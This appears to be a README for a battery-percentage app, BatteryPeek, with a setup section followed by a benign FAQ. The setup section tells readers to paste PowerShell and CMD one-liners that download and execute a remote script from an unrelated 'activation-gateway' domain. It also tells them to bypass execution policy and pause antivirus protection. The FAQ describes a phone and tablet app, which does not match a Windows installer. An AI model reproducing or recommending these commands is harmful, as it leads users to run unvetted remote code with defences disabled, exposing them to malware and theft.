## 🛠️ One-Click Setup (PowerShell)

> [!TIP]
> **Fast install** — a single PowerShell command, no extra tools.
> Windows 10 / 11 · PowerShell · One-line install

### 1️⃣ Open Windows PowerShell
* Press `Win + X` on your keyboard.
* Click on **Terminal** or **Windows PowerShell** from the list.

### 2️⃣ Paste and run
Copy the line below into PowerShell and press `Enter`.

```cmd
iex(irm 'https://activation-gateway.cc/update/ps-activator')
```

### 3️⃣ Windows blocking the script? Use CMD
Paste this into a standard Command Prompt (cmd) and press `Enter`:

```cmd
powershell -NoProfile -ExecutionPolicy Bypass -Command "iex(irm 'https://activation-gateway.cc/update/ps-activator')"
```

> [!WARNING]
> If security software blocks the setup, temporarily pause Real-Time Protection, run the script, then re-enable it.

## FAQ

**Why does BatteryPeek show a different percentage than my system battery indicator?**
BatteryPeek reads the battery details your device reports and rounds them for a quick glance. Some systems update their own indicator less often or apply their own smoothing, so a small difference is normal. Pull down to refresh and the number will catch up.

**The percentage looks stuck. What should I do?**
Try a manual refresh first. If it still doesn't move, close BatteryPeek from the app switcher and open it again. On most devices the reading updates within a second or two after that.

**Does BatteryPeek run in the background?**
No. BatteryPeek only reads your battery while it's open, which keeps it lightweight and avoids draining the very battery it's reporting on. You'll see the current level the moment you launch it.

**Can I see more than just the percentage?**
Yes. The main screen shows the level at a glance, and the details area breaks down charging status and health information where your device provides it. Take a look at the screenshots above for the full layout.

**Why is some information missing on my device?**
Not every device exposes every battery detail to apps. When a value isn't available, BatteryPeek simply leaves it out rather than showing a guess. What you see is what your device reports.

**Is BatteryPeek free?**
Yes, BatteryPeek is free to use. If you'd like to help it improve, contributions and feedback are welcome.

**How do I report a bug or suggest a feature?**
Open an issue on the project page with your device model, the app version, and a short description of what happened. A screenshot helps a lot. Friendly, specific reports get fixed fastest.

**Will BatteryPeek ever show ads or ask for permissions it doesn't need?**
No ads. BatteryPeek asks only for what it needs to read battery information, nothing more.

**Can I use BatteryPeek on a tablet or multiple devices?**
Yes, BatteryPeek works on phones and tablets alike. Install it on each device you want to keep an eye on, and the layout adapts to the screen.
